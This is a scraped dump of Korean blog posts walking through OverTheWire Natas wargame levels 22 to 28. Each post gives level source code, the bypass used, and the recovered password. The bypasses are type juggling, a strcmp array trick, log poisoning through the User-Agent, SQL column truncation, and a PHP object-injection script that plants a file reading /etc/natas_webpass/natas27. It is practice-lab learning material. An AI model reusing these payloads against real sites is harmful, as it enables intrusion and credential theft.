revelio를 요청하면 natas23의 패스워드가 출력 된다.하지만 세션과 admin과 세션의 admin값 이중 하나라도 틀리면 /(최상위 디렉토리)로 이동 시켜버린다. 우린 이를 뚫을 방법을 찾아내면 된다.아주 쉽다.그냥 이동하기전에 패스워드를 보면 된다!! burp suite를 이용한다.HTTP history를 보면 그동안 어떤 요청을 통해 응답이 있었는지 다 캡쳐가 되어있다. ?revelio를 요청한 기록을 본다. level23의 패스워드를 찾았다! D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE","link":"/2022/01/31/Natas/natas22/"},{"title":"Natas 워게임 level23 풀이","text":"Level Goal “ “ “ “ Username: natas23URL: http://natas23.natas.labs.overthewire.org &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall-data.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas23&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas23&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Password: &lt;form name=&quot;input&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; size=20&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt; &lt;/form&gt; &lt;?php if(array_key_exists(&quot;passwd&quot;,$_REQUEST)){ if(strstr($_REQUEST[&quot;passwd&quot;],&quot;iloveyou&quot;) &amp;&amp; ($_REQUEST[&quot;passwd&quot;] &gt; 10 )){ echo &quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;; echo &quot;&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;&quot;; } else{ echo &quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;; } } // morla / 10111 ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; passwd의 값이 iloveyou와 10이상 포함 되어야 패스워드가 출력 된다.음 그냥 10이상 숫자와 iloveyou를 넣으면 될 것 같다?? http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou 아마 느스한 타입? 언어 때문인 것 같다. (필자는 자바 강의를 받았을 때 이와 비슷한 것을 String타입의 concatenation라고 배웠음) String 타입을 만나는 순간 String 타입으로 변한다. php 변수는 변수에 들어가는 값의 타입에 따라 데이터 타입이 결정될 수 있다는 것이다. 처음엔 11이 정수형으로 인식되고 나중에 들어온 iloveyou으로 인해 문자열로 바뀌며 인식되는 것 같다. level24의 패스워드를 찾았다! OsRmXFguozKpTZZ5X14zNO43379LZveg","link":"/2022/01/31/Natas/natas23/"},{"title":"나중에 바꾸고 싶은 테마","text":"검정 바탕에 심플하면서도 예쁜https://github.com/cotes2020/jekyll-theme-chirpy/","link":"/2022/02/02/theme-collection/"},{"title":"CTF 연습 사이트","text":"dvwa : http://www.dvwa.co.uk/ 취약점 진단 및 모의해킹 공부/실습을 할 수 있도록 만들어진 취약한 웹 어플리케이션 bWAPP : http://www.itsecgames.com/ 수많은 웹 관련 취약점을 실습할 수 있도록 구성된 웹 애플리케이션입니다. vulnhub : https://www.vulnhub.com/ CTF와 모의해킹 취업 준비를 한번에??? 여러 협력 회사나 개인들이 취약한 가상환경을 만든 후 관리자 권한으로 키 값을 숨겨놓는 형태로 배포 중","link":"/2022/02/14/wargame/"},{"title":"Natas 워게임 level24 풀이","text":"Level Goal Password: 비밀번호: Username: natas24URL: http://natas24.natas.labs.overthewire.org &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall-data.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas24&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas24&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Password: &lt;form name=&quot;input&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; size=20&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt; &lt;/form&gt; &lt;?php if(array_key_exists(&quot;passwd&quot;,$_REQUEST)){ // get 방식으로 넘어온 변수가 passwd이면 if(!strcmp($_REQUEST[&quot;passwd&quot;],&quot;&lt;censored&gt;&quot;)){ passwd값과 검열된 값을 비교 echo &quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;; echo &quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;; } else{ echo &quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;; } } // morla / 10111 ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 코드를 보니 strcmp로 값을 비교하여 참이면 패스워드를 출력한다.이번 문제는 strcmp의 취약점인 것 같다.그래서 strcmp의 취약점에 대해서 검색해보았다. 취약점이 아주 자세하게 나왔다!! 이번건 날먹할 수 있겠다. strcmp() 함수는 다음과 같이 두 스트링 사이의 관계를 나타내는 값을 리턴한다. 값 의미 0보다 작음 String1이 String2보다 작음 0 String1이 String2와 같음 0보다 큼 String1이 String2보다 큼 여기서 취약점이 발생한다.문자열이 아닌 배열이 들어가면 NULL값을 반환한다. Null은 0과 같기에 부정을 하면 1이 되버린다.이러한 취약점을 이용하면 패스워드를 출력할 수 있을 것이다. get방식으로 passwd= 대신 passwd[]로 요청하면 배열로 요청하기에 NULL값을 반환한다. http://natas24.natas.labs.overthewire.org/?passwd[] passwd[]뒤에 =(값)을 넣어도 되지만 그냥 passwd[]해도 출력이 되어 그냥 이렇게 하였다. level25의 패스워드를 찾았다! GHF6X7YwACaYYssHVY05cFq83hRktl4c","link":"/2022/02/02/Natas/natas24/"},{"title":"Natas 워게임 level25 풀이","text":"Level Goal Quote 인용문 Username: natas25URL: http://natas25.natas.labs.overthewire.org QuoteYou see, no one’s going to help you Bubby, because there isn’t anybody out there to do it. No one. We’re all just complicated arrangements of atoms and subatomic particles - we don’t live. But our atoms do move about in such a way as to give us identity and consciousness. We don’t die; our atoms just rearrange themselves. There is no God. There can be no God; it’s ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don’t even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that’s what you must do, Bubby: think God out of existence; take responsibility for who you are. Bubby를 도와줄 사람이 아무도 없기 때문에 아무도 도와주지 않을 것입니다. 아무도. 우리는 모두 원자와 아원자 입자의 복잡한 배열일 뿐입니다. 우리는 살지 않습니다. 그러나 우리의 원자는 우리에게 정체성과 의식을 부여하는 방식으로 움직입니다. 우리는 죽지 않습니다. 우리의 원자는 단지 스스로를 재배열합니다. 신은 없다. 신은 있을 수 없다. 우월한 존재로 생각하는 것은 어리석은 일입니다. 열등한 존재는 어쩌면 존재하지도 않는 우리가 하나님이 이 땅을 마련하신 것보다 더 질서 있고 조화롭게 삶을 정리하고 있기 때문일 것입니다. 우리는 측정합니다. 우리는 음모를 꾸미다; 우리는 멋진 새로운 것들을 만듭니다. 우리는 우리 존재의 건축가입니다. 수백만 명의 무고한 아이들을 학살하고 천천히 고통스럽게 굶어 죽게 하고 때리고 고문하고 거부하는 신 앞에 무릎을 꿇는다는 것은 얼마나 미친 생각인가. 우리가 그런 신을 모욕해서는 안 된다고 생각하는 것은 얼마나 어리석은 일입니까? 하나님을 존재하지 않게 생각하는 것이 우리의 의무입니다. 그를 모욕하는 것은 우리의 의무입니다. 젠장, 맙소사! 당신이 감히 나를 공격하십시오, 이 폭군, 존재하지 않는 사기꾼! 신을 존재하지 않게 생각하는 것은 모든 인간의 의무입니다. 그러면 우리에게는 미래가 있습니다. 그래야만 우리가 우리 자신에 대해 전적인 책임을 지기 때문입니다. 그리고 그것이 당신이 해야 할 일입니다, Bubby: 신이 존재하지 않는다고 생각하십시오. 당신이 누구인지에 대한 책임을 집니다. 뭐지? 되게 무언가 이상한 음모론 같은 것이 나열되어 있다. 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall-data.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas25&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;?php // cheers and &lt;3 to malvina // - morla function setLanguage(){ /* language setup */ if(array_key_exists(&quot;lang&quot;,$_REQUEST)) if(safeinclude(&quot;language/&quot; . $_REQUEST[&quot;lang&quot;] )) return 1; safeinclude(&quot;language/en&quot;); } function safeinclude($filename){ // check for directory traversal if(strstr($filename,&quot;../&quot;)){ logRequest(&quot;Directory traversal attempt! fixing request.&quot;); $filename=str_replace(&quot;../&quot;,&quot;&quot;,$filename); } // dont let ppl steal our passwords if(strstr($filename,&quot;natas_webpass&quot;)){ logRequest(&quot;Illegal file access detected! Aborting!&quot;); exit(-1); } // add more checks... if (file_exists($filename)) { include($filename); return 1; } return 0; } function listFiles($path){ $listoffiles=array(); if ($handle = opendir($path)) while (false !== ($file = readdir($handle))) if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) $listoffiles[]=$file; closedir($handle); return $listoffiles; } function logRequest($message){ $log=&quot;[&quot;. date(&quot;d.m.Y H::i:s&quot;,time()) .&quot;]&quot;; $log=$log . &quot; &quot; . $_SERVER['HTTP_USER_AGENT']; $log=$log . &quot; \\&quot;&quot; . $message .&quot;\\&quot;\\n&quot;; $fd=fopen(&quot;/var/www/natas/natas25/logs/natas25_&quot; . session_id() .&quot;.log&quot;,&quot;a&quot;); fwrite($fd,$log); fclose($fd); } ?&gt; &lt;h1&gt;natas25&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;div align=&quot;right&quot;&gt; &lt;form&gt; &lt;select name='lang' onchange='this.form.submit()'&gt; &lt;option&gt;language&lt;/option&gt; &lt;?php foreach(listFiles(&quot;language/&quot;) as $f) echo &quot;&lt;option&gt;$f&lt;/option&gt;&quot;; ?&gt; &lt;/select&gt; &lt;/form&gt; &lt;/div&gt; &lt;?php session_start(); setLanguage(); echo &quot;&lt;h2&gt;$__GREETING&lt;/h2&gt;&quot;; echo &quot;&lt;p align=\\&quot;justify\\&quot;&gt;$__MSG&quot;; echo &quot;&lt;div align=\\&quot;right\\&quot;&gt;&lt;h6&gt;$__FOOTER&lt;/h6&gt;&lt;div&gt;&quot;; ?&gt; &lt;p&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 상위 디렉토리로 갈수 없게 ../를 필터링 해놓았다. 하지만 이것을 우회 할 방법은 많다.예) …/./처음엔 디렉토리 트레버셜공격인 줄 알았지만 natas_webpass도 필터링을 하였다.이 문제는 트레버셜 공격으로 하는 건 아닌 것 같다. 코드를 더 보니 날짜와 HTTP_USER_AGENT, $message를 /var/www/natas/natas25/logs/natas25_세션.log에 열기 전용으로 연다음 집어 넣었다. 일단 /var/www/natas/natas25/logs/natas25_세션.log에 들어 가본다. 날짜와 HTTP_USER_AGENT, $message가 들어가 있는 로그들이 나열 되어 있다. HTTP_USER_AGENT? 어디서 많다.맞다 요청페이지에서 봤다.HTTP_USER_AGENT의 내용을 그대로 출력하는 것 보니 이곳에 natas26패스워드를 출력하라는 코드를 넣으면 될 것 같다. level26의 패스워드를 찾았다! oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T","link":"/2022/02/04/Natas/natas25/"},{"title":"Natas 워게임 level26 풀이","text":"Level Goal Draw a line: 선을 그리다: Username: natas26URL: http://natas26.natas.labs.overthewire.org 일단 뭔가 4개의 입력값을 받아 선을 그리는 것 같다. 왜 입력값이 4개지? 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall-data.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas26&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private $exitMsg; function __construct($file){ // initialise variables $this-&gt;initMsg=&quot;#--session started--#\\n&quot;; $this-&gt;exitMsg=&quot;#--session end--#\\n&quot;; $this-&gt;logFile = &quot;/tmp/natas26_&quot; . $file . &quot;.log&quot;; // write initial message $fd=fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$initMsg); fclose($fd); } function log($msg){ $fd=fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$msg.&quot;\\n&quot;); fclose($fd); } function __destruct(){ // write exit message $fd=fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$this-&gt;exitMsg); fclose($fd); } } function showImage($filename){ if(file_exists($filename)) echo &quot;&lt;img src=\\&quot;$filename\\&quot;&gt;&quot;; } function drawImage($filename){ $img=imagecreatetruecolor(400,300); drawFromUserdata($img); imagepng($img,$filename); imagedestroy($img); } function drawFromUserdata($img){ if( array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$_GET[&quot;x1&quot;], $_GET[&quot;y1&quot;], $_GET[&quot;x2&quot;], $_GET[&quot;y2&quot;], $color); } if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;])); if($drawing) foreach($drawing as $object) if( array_key_exists(&quot;x1&quot;, $object) &amp;&amp; array_key_exists(&quot;y1&quot;, $object) &amp;&amp; array_key_exists(&quot;x2&quot;, $object) &amp;&amp; array_key_exists(&quot;y2&quot;, $object)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$object[&quot;x1&quot;],$object[&quot;y1&quot;], $object[&quot;x2&quot;] ,$object[&quot;y2&quot;] ,$color); } } } function storeData(){ $new_object=array(); if(array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET)){ $new_object[&quot;x1&quot;]=$_GET[&quot;x1&quot;]; $new_object[&quot;y1&quot;]=$_GET[&quot;y1&quot;]; $new_object[&quot;x2&quot;]=$_GET[&quot;x2&quot;]; $new_object[&quot;y2&quot;]=$_GET[&quot;y2&quot;]; } if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;])); } else{ // create new array $drawing=array(); } $drawing[]=$new_object; setcookie(&quot;drawing&quot;,base64_encode(serialize($drawing))); } ?&gt; &lt;h1&gt;natas26&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; Draw a line:&lt;br&gt; &lt;form name=&quot;input&quot; method=&quot;get&quot;&gt; X1&lt;input type=&quot;text&quot; name=&quot;x1&quot; size=2&gt; Y1&lt;input type=&quot;text&quot; name=&quot;y1&quot; size=2&gt; X2&lt;input type=&quot;text&quot; name=&quot;x2&quot; size=2&gt; Y2&lt;input type=&quot;text&quot; name=&quot;y2&quot; size=2&gt; &lt;input type=&quot;submit&quot; value=&quot;DRAW!&quot;&gt; &lt;/form&gt; &lt;?php session_start(); if (array_key_exists(&quot;drawing&quot;, $_COOKIE) || ( array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET))){ $imgfile=&quot;img/natas26_&quot; . session_id() .&quot;.png&quot;; drawImage($imgfile); showImage($imgfile); storeData(); } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 첫번째 점의 x,y좌표와 두번째 점의 x,y좌표를 입력받아 선으로 이어주는 코드다! drawing변수에 get으로 넘어온 배열값을 직렬화(일렬화) 시켜주고 base64로 인코딩하여 넣은 값을 쿠키값에 붙여주는 코드도 있다. 뭐 어떻게 풀어야할지 감도 안잡힌다.어떤 함수가 어떠한 기능을 하는지도..(응애 나 초보.. 아무것도 몰라) 일단 보이는 함수를 검색해보고 관련 취약점도 검색해 보자! __construct에서 취약점을 검색하였는데 PHP Object Injection에 관한 내용이 있었다. 출처 및 참고 : https://blog.naver.com/lstarrlodyl/222172446060https://velog.io/@woounnan/WEB-PHP-Serialization __construct나 __destruct등 함수는 Magic Method라 불리는데Magic Method는 직렬화 기능 즉, serialize기능이 수행될 때 자동적으로 실행되는 취약점이 발생한다. Object Injection오브젝트는 클래스가 인스턴스화된 객체를 말한다.안에는 그 오브젝트의 메소드, 변수 등 관련된 값이 포함되어있다.serialize로 인해 이런 오브젝트 값을 직렬화시켜 외부에 전달하거나 전달받아 관련된 처리를 하는 형태의 코드를 작성할 수 있게 되었다.하지만 이런 구조의 웹서버에 변조된 오브젝트를 전달한다면?웹서버는 조작된 값을 그대로 받아 의도하지 않은 데이터나 코드를 실행할 것이다.이게 바로 php의 serialize에 의해 발생할 수 있는 Object Injection 취약점이다. drawing 값을 unserialize하여 코드를 실행하는 drawFromUserdata에서 취약점이 발생하였다. drawing 값에 /etc/natas_webpass/natas27의 내용을 출력하는 코드를 넣으면 될 것 같다.코드는 __construct를 이용하여 만든다. 인스턴스가 생성될 때 자동으로 호출되는 함수이다.인스턴스를 생성했을 때 코드를 base64로 인코딩하면 된다. &lt;?php class Logger{ private $logFile; private $initMsg; private $exitMsg; function __construct(){ $this-&gt;initMsg=&quot;&quot;; // 여기에다가 php코드를 넣어 봤는데 실행이 안됨 $this-&gt;exitMsg=&quot;&lt;?php readfile('/etc/natas_webpass/natas27');?&gt;&quot;; $this-&gt;logFile=&quot;img/natas27_passwd.php&quot;; //이미지 파일 저장 경로를 참고함 } } $code = new Logger(); echo base64_encode(serialize($code)); ?&gt; Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMjoiaW1nL25hdGFzMjdfcGFzc3dkLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ3OiI8P3BocCByZWFkZmlsZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiI7fQ== 이를 넣어 요청을 한뒤 설정해놓은 경로로 이동해본다. level27의 패스워드를 찾았다! 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ","link":"/2022/02/14/Natas/natas26/"},{"title":"해킹할 때 유용한 사이트","text":"시스템 해킹할 때 유용한 사이트잘못 구성된 시스템에서 로컬 보안 제한을 우회하는 데 사용할 수 있는 Unix 바이너리의 선별된 목록입니다. https://gtfobins.github.io/ 온라인 sql 실행 https://sqltest.net/","link":"/2022/02/14/GTFObins/"},{"title":"Natas 워게임 level27 풀이","text":"Level Goal Username:Password: 유저이름: 비밀번호: Username: natas27URL: http://natas27.natas.labs.overthewire.org &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas27&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas27&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? // morla / 10111 // database gets cleared every 5 min /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ function checkCredentials($link,$usr,$pass){ $user=mysql_real_escape_string($usr); $password=mysql_real_escape_string($pass); $query = &quot;SELECT username from users where username='$user' and password='$password' &quot;; $res = mysql_query($query, $link); if(mysql_num_rows($res) &gt; 0){ return True; } return False; } function validUser($link,$usr){ $user=mysql_real_escape_string($usr); $query = &quot;SELECT * from users where username='$user'&quot;; $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &gt; 0) { return True; } } return False; } function dumpData($link,$usr){ $user=mysql_real_escape_string($usr); $query = &quot;SELECT * from users where username='$user'&quot;; $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &gt; 0) { while ($row = mysql_fetch_assoc($res)) { // thanks to Gobo for reporting this bug! //return print_r($row); return print_r($row,true); } } } return False; } function createUser($link, $usr, $pass){ $user=mysql_real_escape_string($usr); $password=mysql_real_escape_string($pass); $query = &quot;INSERT INTO users (username,password) values ('$user','$password')&quot;; $res = mysql_query($query, $link); if(mysql_affected_rows() &gt; 0){ return True; } return False; } if(array_key_exists(&quot;username&quot;, $_REQUEST) and array_key_exists(&quot;password&quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas27', '&lt;censored&gt;'); mysql_select_db('natas27', $link); if(validUser($link,$_REQUEST[&quot;username&quot;])) { //user exists, check creds if(checkCredentials($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;])){ echo &quot;Welcome &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;!&lt;br&gt;&quot;; echo &quot;Here is your data:&lt;br&gt;&quot;; $data=dumpData($link,$_REQUEST[&quot;username&quot;]); print htmlentities($data); } else{ echo &quot;Wrong password for user: &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;&lt;br&gt;&quot;; } } else { //user doesn't exist if(createUser($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;])){ echo &quot;User &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot; was created!&quot;; } } mysql_close($link); } else { ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; Password: &lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 유저 이름과 패스워드를 입력받고 db에서 확인하여 일치하면 유저 이름과 관련된 데이터 값을 전부 뽑는 코드인 것 같다.. 전과 비슷한 것 같지만 이번에 db에 존재하지 않으면 새로 생성해버린다.. 그리고 값일 입력받을 때 mysql_real_escape_string을 사용하여 ‘나 “, \\등에 이스케이프 문자()를 붙여 SQL injection 공격을 막아버렸다.. 응애 무수한 mysql_real_escape_string 우회를 시도한 끝에 mysql_real_escape_string로 푸는 것이 아니라는 것을 알게 되었다.결국 다른사람의 풀이를 보았다…응애 보안 너무 어려운 거시와요…. 참고 및 출처 : https://www.youtube.com/watch?v=Y7WXxmWKfxs :https://dev.mysql.com/doc/refman/5.7/en/char.html : https://securitytimes.wordpress.com/2017/07/13/natas27-28/ 이 문제는 테이블에서 정의한 길이보다 더 긴 문자열을 받았을 때 일어나는 현상을 이용한 문제이다!!!!! For VARCHAR columns, trailing spaces in excess of the column length are truncated prior to insertion and a warning is generated, regardless of the SQL mode in use. VARCHAR values are not padded when they are stored. Trailing spaces are retained when values are stored and retrieved, in conformance with standard SQL. VARCHAR 열의 경우 사용 중인 SQL 모드에 관계없이 열 길이를 초과하는 후행 공백이 잘리고 삽입 전에 경고가 생성됩니다. VARCHAR 값은 저장될 때 채워지지 않습니다. 표준 SQL에 따라 값을 저장하고 검색할 때 후행 공백이 유지됩니다. 이와 같은 조건에서 실행해 본다. (문자열 길이는 임의로 줄였다. 그리고 공백뒤에 문자열을 입력하면 그 문자열은 짤린 채 검색되야하는데 온라인 실행기에서는 오류가 발생하기에 공백으로 길이를 넘기기만 했다.)그렇다 공백으로 문자열 길이를 넘게 입력해도 똑같이 natas28로 조회가 된다. 이를 이용하여 문제를 풀어본다. 문자열 길이를 64로 선언되있으니 natas28을 제외한 나머지 57개를 공백으로 채워준다.공백으로 채우기만 하면 생성이 안되기에 뒤에 아무 문자열을 입력한다. natas28 1이 생성되었다. 그리고 그냥 natas28을 조회해 본다. level28의 패스워드를 찾았다! JWwR438wkgTsNKBbcJoowyysdM82YjeF","link":"/2022/02/15/Natas/natas27/"},{"title":"Natas 워게임 level28 풀이","text":"Level Goal Whack Computer Joke Database Whack 컴퓨터 농담 데이터베이스 Username: natas28URL: http://natas28.natas.labs.overthewire.org 이번엔 소스코드를 주지 않았다…매우 험난 것으로 예상 된다. 일단 Search에 값을 넣어 본다. url을 보니 query에 원래 입력한 값이 아닌 다른 무언가가 있다. Cyberchef를 사용하여 이 값이 url인코딩되어 있는 값이란 것을 알게 되었다. 일단 복호화를 진행하여 다음과 같은 값을 얻어냈다. G glEae6W/1XjA7vRm21nNyEco/c J2TdR0Qp8dcjPIQ9i1qWcR wgATYlCscOxBZIaVSupG 